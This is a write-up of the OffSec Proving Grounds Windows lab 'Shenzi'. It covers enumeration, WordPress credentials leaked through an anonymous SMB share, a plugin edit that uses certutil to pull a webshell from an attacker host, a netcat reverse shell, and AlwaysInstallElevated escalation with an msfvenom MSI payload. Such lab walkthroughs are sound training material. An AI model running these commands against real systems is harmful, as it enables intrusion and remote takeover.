# Shenzi

## Info

Shenzi is an intermediate windows machine from offsec proving grounds.

## Nmap

All tcp ports scan.

```
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql?        syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## SMB

anonymous login aloud to Shenzi share, the passwords.txt file has the following wordpress creds.

```
admin:FeltHeadwallWight357
```

## HTTP

After reading phpinfo and fuzzing, I tried the following directory which returned the wordpress site.

```
/shenzi
```

## User

After logging into the admin panel, I add the following line to the hello dolly plugin.

```
system("certutil -urlcache -split -f http://<ip>/shell.php C:\\xampp\\htdocs\\shenzi\\shell.php");
```

Activate the plugin to get a webshell uploaded.

Using the shell, I upload nc.exe.

```
impacket-smbserver -smb2support  share $(pwd)
```

```
copy \\<ip>\share\nc.exe C:\Users\Shenzi\Documents\
```

Execute.

```
C:\Users\Shenzi\Documents\nc.exe <ip> 5040 -e cmd
```

## Root

Checking for always install elevated policy.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

As these are set to 0x1 it is vulnerable.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.169 LPORT=7680 -f msi > shell.msi
```

Execute to receive the shell.

```
.\shell.msi
```
